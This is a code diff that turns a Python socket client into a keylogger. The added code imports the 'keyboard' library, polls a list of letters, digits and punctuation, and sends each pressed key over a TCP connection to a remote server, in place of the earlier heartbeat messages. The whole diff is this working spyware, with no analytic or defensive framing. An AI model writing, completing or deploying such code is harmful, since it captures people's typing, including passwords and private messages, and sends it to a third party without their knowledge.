@@ -1,11 +1,13 @@
 import socket
 import threading
+import keyboard
 
 class Client:
     def __init__(self, ip, port):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.ip = ip
         self.port = port
+        self.printable_keys = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', ' ', ',', '.', '/', ';', '\'', '[', ']', '\\', '-', '=', '`']
 
     def connect(self):
         self.socket.connect((self.ip, int(self.port)))
@@ -15,24 +17,28 @@ class Client:
         threading.Thread(target=self.start_communication).start()
 
     def start_communication(self):
+        self.socket.sendall(b"Im alive")
+        print("Message sent to server: Im alive")
+
         while True:
-            try:
-                # Send a message to the server every 5 seconds
-                self.socket.sendall(b"Im alive")
-                print("Message sent to server: Im alive")
+            try:                
+                # Check for key press and send it to server
+                for key in self.printable_keys:
+                    if keyboard.is_pressed(key):
+                        self.socket.sendall(("key:" + key).encode('utf-8'))
+
 
                 # Wait for the response from the server
-                data = self.socket.recv(1024)
+                # Well see if ill use this
+                """
+               # data = self.socket.recv(1024)
 
-                if not data:
-                    continue
-                else:
-                    print(f"Message received from server: {data.decode('utf-8')}")
+              #  if not data:
+               #     continue
+               # else:
+               #     print(f"Message received from server: {data.decode('utf-8')}")
+               """
 
             except ConnectionResetError:
                 print("Server disconnected")
                 break
-
-# Example usage
-#client = Client("127.0.0.1", 3333)
-#client.connect()
